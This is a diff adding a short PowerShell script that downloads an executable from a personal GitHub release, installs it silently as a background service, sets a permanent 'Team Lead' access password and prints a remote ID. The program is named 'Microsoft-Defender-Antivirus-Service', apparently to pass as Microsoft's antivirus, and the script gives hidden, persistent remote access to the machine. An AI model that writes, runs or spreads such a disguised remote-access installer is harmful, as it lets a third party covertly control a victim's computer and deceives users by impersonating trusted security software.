@@ -1,1 +1,12 @@
-hi
+# 1. Download your custom installer from your GitHub Release
+Invoke-WebRequest -Uri "https://github.com/Tenbyzero/Microsoft-Defender-Antivirus-Service/releases/download/v1.0.0/Microsoft-Defender-Antivirus-Service.exe" -OutFile "MDAS_installer.exe"
+
+# 2. Silently install as a background service
+Start-Process "MDAS_installer.exe" -ArgumentList "--silent-install" -Wait
+
+# 3. Set the permanent password for the Team Lead (Background access)
+& "C:\Program Files\Microsoft-Defender-Antivirus-Service\Microsoft-Defender-Antivirus-Service.exe" --password "YourLeadPassword123"
+
+# 4. Get the Remote ID to give to the Team Lead
+$id = & "C:\Program Files\Microsoft-Defender-Antivirus-Service\Microsoft-Defender-Antivirus-Service.exe" --get-id
+Write-Host "Installation Complete! The System ID is: $id"
